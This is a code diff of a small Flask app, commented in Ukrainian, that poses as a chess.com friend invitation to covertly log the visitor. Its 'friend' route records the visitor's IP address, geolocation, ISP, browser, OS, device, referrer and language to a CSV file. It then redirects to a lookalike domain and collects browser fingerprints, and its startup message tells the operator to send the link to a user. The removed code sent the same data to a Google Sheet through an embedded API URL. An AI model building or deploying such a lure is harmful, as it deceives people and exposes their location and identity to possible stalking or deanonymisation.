@@ -1,74 +1,80 @@
-from flask import Flask, request, render_template
-import datetime
-import geoip2.database
+from flask import Flask, request, render_template, redirect, jsonify
 import user_agents
-import os
 import requests
+from datetime import datetime
+import csv
 
 app = Flask(__name__)
 
-MMDB_URL = os.getenv("MMDB_URL")
-MMDB_PATH = "GeoLite2-City.mmdb"
-
-if not os.path.exists(MMDB_PATH):
-    print("GeoLite2-City.mmdb not found, downloading...")
-    if not MMDB_URL:
-        raise RuntimeError("MMDB_URL not set in environment variables")
-    r = requests.get(MMDB_URL, timeout=120)
-    r.raise_for_status()
-    with open(MMDB_PATH, "wb") as f:
-        f.write(r.content)
-    print("Downloaded GeoLite2-City.mmdb, size:", os.path.getsize(MMDB_PATH))
-    with open(MMDB_PATH, "rb") as f:
-        head = f.read(10)
-        print("First bytes:", head)
-    assert os.path.getsize(MMDB_PATH) > 10_000_000, "GeoLite2-City.mmdb файл занадто малий!"
-
-geoip_reader = geoip2.database.Reader(MMDB_PATH)
-
-
-NOCODE_API_URL = "https://v1.nocodeapi.com/mrgrinder/google_sheets/bWHFqPYyBfrPywCF"
-
-def log_to_gsheet(data):
-    r = requests.post(NOCODE_API_URL, json=[data])
-    r.raise_for_status()
-
-@app.route("/invite/friend/<ref>")
-def chess_invite(ref):
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ua_string = request.headers.get("User-Agent")
-    ua = user_agents.parse(ua_string)
-
+def get_public_ip():
     try:
-        response = geoip_reader.city(ip)
-        country = response.country.name
-        city = response.city.name
-        isp = response.traits.isp
+        resp = requests.get("https://api.ipify.org?format=json", timeout=5)
+        return resp.json()["ip"]
+    except Exception:
+        return "N/A"
+
+def get_geo_info(ip):
+    try:
+        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
+        data = resp.json()
+        return data.get("city"), data.get("region"), data.get("country"), data.get("org")
     except:
-        country = city = isp = "Unknown"
+        return "N/A", "N/A", "N/A", "N/A"
 
-    data = {
-        "time": datetime.datetime.utcnow().isoformat(),
-        "ip": ip,
-        "country": country,
-        "city": city,
-        "isp": isp,
-        "user_agent": ua_string,
-        "browser": ua.browser.family + " " + ua.browser.version_string,
-        "os": ua.os.family + " " + ua.os.version_string,
-        "device": ua.device.family,
-        "accept_lang": request.headers.get("Accept-Language"),
-        "invite_ref": ref,
-    }
+# Домашня сторінка, залишу по приколу 
+@app.route("/")
+def home():
+    return render_template("invite.html")
 
-    log_to_gsheet(data)   # <--- ВИКЛИК функції
+# Назва сторінки, можна замінити на щось інше 
+@app.route("/friend")
+def chess_invite():
+    ip = request.headers.get("CF-Connecting-IP") or request.remote_addr
+    ua_string = request.headers.get("User-Agent", "")
+    ua = user_agents.parse(ua_string)
+    referrer = request.referrer
+    lang = request.headers.get("Accept-Language", "")
 
-    return render_template(
-    "invite.html",
-    invite_link=f"https://link.chess.com/friend/{ref}",
-    ref=ref
-)
+    # геоінфо
+    city, region, country, org = get_geo_info(ip)
 
+    with open("visitors.csv", "a", newline="", encoding="utf-8") as f:
+        writer = csv.writer(f)
+        writer.writerow([
+            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            ip,
+            city, region, country, org,
+            ua_string,
+            ua.browser.family,
+            ua.os.family,
+            ua.device.family,
+            referrer,
+            lang
+        ])
+
+    return redirect("https://invite.linkchess.online/check") 
+
+@app.route("/check")
+def check():
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    return render_template("check.html", user_ip=ip, year=datetime.now().year)
+
+@app.route("/save_fingerprint", methods=["POST"]) 
+def save_fingerprint():
+    data = request.json
+    with open("fingerprints.csv", "a", newline="", encoding="utf-8") as f:
+        writer = csv.writer(f)
+        writer.writerow([
+            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            data.get("ip"),
+            data.get("visitorId"),
+            str(data.get("components"))
+        ])
+    return jsonify({"status": "ok"})
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+    host = "0.0.0.0"
+    port = 8080
+    print(f"\n🚀 Flask server запущений!")
+    print(f"🔗 Надішли користувачу це посилання: https://invite.linkchess.online/friend\n")
+    app.run(host=host, port=port)
